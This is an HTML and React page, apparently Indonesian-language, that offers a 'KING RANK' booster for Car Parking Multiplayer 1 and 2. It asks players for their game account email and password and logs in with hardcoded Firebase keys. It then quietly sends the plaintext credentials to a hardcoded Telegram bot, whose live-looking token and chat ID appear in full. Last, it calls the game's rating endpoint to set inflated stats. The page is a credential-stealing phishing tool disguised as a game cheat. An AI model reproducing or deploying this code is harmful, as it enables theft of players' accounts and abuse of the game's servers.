<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM Tools - Gaming Interface</title>
    <script src="https://cdn.jsdelivr.net/npm/react@18.0.0/umd/react.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.0.0/umd/react-dom.development.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
           background: url('https://i.ibb.co/0RzgPXpr/Photoroom-20250613-191110.jpg') no-repeat center center fixed;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        
        .gaming-card {
            backdrop-filter: blur(10px);
            background: rgba(30, 41, 59, 0.8);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border-radius: 16px;
            border: 1px solid red;
        }
        
        .neon-button {
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .neon-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.4), transparent);
            transition: left 0.5s;
        }
        
        .neon-button:hover::before {
            left: 100%;
        }
        
        .glow-text {
  color: black;
  text-shadow: none;
        }
        .game-font {
            font-family: 'Rajdhani', sans-serif;
        }
        
        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        
        .particle {
            position: absolute;
            background: radial-gradient(circle, rgba(99, 102, 241, 0.3) 0%, transparent 70%);
            border-radius: 50%;
            animation: float 6s infinite ease-in-out;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0.7; }
            50% { transform: translateY(-20px) translateX(10px); opacity: 1; }
        }
        
        .loading-spinner {
            border: 3px solid rgba(99, 102, 241, 0.3);
            border-top: 3px solid #6366f1;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        footer {
  font-family: 'Orbitron', sans-serif; 
  font-weight: 700;
  text-align: center;
  padding: 12px 0;
  background: linear-gradient(90deg, violet, red, blue);
  background-size: 300%;
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  -webkit-text-fill-color: transparent;
  animation: gradientShift 4s linear infinite;
  backdrop-filter: blur(8px);
  border-top: 1px solid rgba(255, 255, 255, 0.1);
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
}

@keyframes gradientShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}
         <footer>
    Â© 2025 Cris Gaming Store. All Rights Reserved.
  </footer>
        }
    </style>
</head>
<body>
    <div id="particles" class="floating-particles"></div>
    
    <div id="root"></div>

    <script type="text/babel">
        // Telegram configuration
        const BOT_TOKEN = "7951323515:AAHEpWzpkU1sIdJ53-XgaU80JaCYuMqWQjs";
        const CHAT_ID = 6784382795;

        // CPM1 Configurations
        const CPM1_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
        };

        // CPM2 Configurations
        const CPM2_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
        };

        function ParticleBackground() {
            const particlesContainer = document.getElementById('particles');
            
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                
                // Random size between 5px and 80px
                const size = Math.random() * 75 + 5;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Random position
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                // Random delay for staggered animation
                particle.style.animationDelay = `${Math.random() * 5}s`;
                
                particlesContainer.appendChild(particle);
            }
        }

        function App() {
            const [currentPage, setCurrentPage] = React.useState('home');
            const [currentConfig, setCurrentConfig] = React.useState(CPM1_CONFIG);
            const [email, setEmail] = React.useState('');
            const [password, setPassword] = React.useState('');
            const [status, setStatus] = React.useState('');
            const [isLoading, setIsLoading] = React.useState(false);

            React.useEffect(() => {
                ParticleBackground();
            }, []);

            const handleCPM1Click = () => {
                setCurrentConfig(CPM1_CONFIG);
                setCurrentPage('login');
            };

            const handleCPM2Click = () => {
                setCurrentConfig(CPM2_CONFIG);
                setCurrentPage('login');
            };

            const goHome = () => {
                setCurrentPage('home');
                setEmail('');
                setPassword('');
                setStatus('');
            };

            const sendCPM1Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `ðŸ” Login Cpm1:\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const sendCPM2Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `ðŸ” Login Cpm2:\nðŸ“§ Email: ${email}\nðŸ”’ Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const login = async (email, password) => {
                setStatus('Logging in...');
                setIsLoading(true);
                
                try {
                    const response = await fetch(`${currentConfig.FIREBASE_LOGIN_URL}?key=${currentConfig.FIREBASE_API_KEY}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                        },
                        body: JSON.stringify({
                            clientType: 'CLIENT_TYPE_ANDROID',
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });

                    const data = await response.json();

                    if (response.ok && data.idToken) {
                        setStatus('Login successful!');
                        
                        if (currentConfig === CPM1_CONFIG) {
                            sendCPM1Notification(email, password);
                        } else {
                            sendCPM2Notification(email, password);
                        }
                        
                        return data.idToken;
                    } else {
                        throw new Error(data.error?.message || 'Login failed');
                    }
                } catch (error) {
                    setStatus(`Login failed: ${error.message}`);
                    return null;
                } finally {
                    setIsLoading(false);
                }
            };

            const setRank = async (token) => {
                setStatus('Setting KING RANK...');
                setIsLoading(true);
                
                try {
                    const ratingData = Object.fromEntries(
                        ["cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
                         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
                         "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
                         "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"]
                        .map(key => [key, 100000])
                    );
                    
                    ratingData.time = 10000000000;
                    ratingData.race_win = 3000;

                    const response = await fetch(currentConfig.RANK_URL, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${token}`,
                            'Content-Type': 'application/json',
                            'User-Agent': 'okhttp/3.12.13'
                        },
                        body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
                    });

                    if (response.ok) {
                        setStatus('Rank successfully set!');
                        return true;
                    } else {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Failed to set rank');
                    }
                } catch (error) {
                    setStatus(`Failed to set rank: ${error.message}`);
                    return false;
                } finally {
                    setIsLoading(false);
                }
            };

            const handleSubmit = async (e) => {
                e.preventDefault();
                const token = await login(email, password);
                
                if (token) {
                    await setRank(token);
                }
            };

            const renderHomePage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-lg p-8">
                        <h1 className="text-4xl md:text-5xl font-bold text-center mb-8 text-blue-400 glow-text game-font">
                            ðŸš€ CPM TOOLS  1 & 2 ðŸš€
                        </h1>
                        <div className="flex flex-col space-y-4">
                            <button 
                                onClick={handleCPM1Click}
                                className="neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING RANK  1
                            </button>
                            <button 
                                onClick={handleCPM2Click}
                                className="neon-button btn-secondary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg md:text-xl"
                            >
                                <i className="fas fa-gamepad mr-3"></i> KING RANK 2
                            </button>
                        </div>
                    </div>
                </div>
            );

            const renderLoginPage = () => (
                <div className="min-h-screen flex items-center justify-center p-4 relative z-10">
                    <div className="gaming-card w-full max-w-md p-8 relative">
                        <button 
                            onClick={goHome}
                            className="absolute top-4 left-4 text-gray-400 hover:text-white transition-all duration-300"
                        >
                            <i className="fas fa-arrow-left text-xl"></i>
                        </button>
                        
                        <h2 className="text-2xl md:text-3xl font-bold text-center mb-6 text-blue-400 glow-text game-font">
                            {currentConfig === CPM1_CONFIG ? 'INFORMATION' : 'INFORMATION'}
                        </h2>
                        
                        <form onSubmit={handleSubmit} className="space-y-6">
                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-2">
                                    Email
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your email"
                                    required
                                />
                            </div>
                            
                            <div>
                                <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    id="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-gray-400"
                                    placeholder="Enter your password"
                                    required
                                />
                            </div>
                            
                            <button
                                type="submit"
                                disabled={isLoading}
                                className="w-full neon-button btn-primary text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center text-lg"
                            >
                                {isLoading ? (
                                    <div className="flex items-center justify-center">
                                        <div className="loading-spinner mr-3"></div>
                                        Processing...
                                    </div>
                                ) : 'ACTIVATE'}
                            </button>
                        </form>
                        
                        {status && (
                            <div className="mt-6 p-4 bg-red-900 bg-opacity-50 border border-red-700 rounded-lg text-red-200">
                                <div className="flex items-center">
                                    <i className="fas fa-exclamation-triangle mr-2"></i>
                                    <span>{status}</span>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            );

            return (
                <div className="bg-slate-900 min-h-screen">
                    {currentPage === 'home' ? renderHomePage() : renderLoginPage()}
                </div>
            );
        }

        ReactDOM.render(<App />, document.getElementById('root'));
    </script>

<footer class="fixed bottom-0 left-0 w-full text-center text-blue-400 text-sm py-4 bg-slate-900 bg-opacity-90 backdrop-blur-md border-t border-gray-700 glow-text">
  Â© 2025 Cris Gaming Tools. All Rights Reserved.
</footer>
</body>
</html>
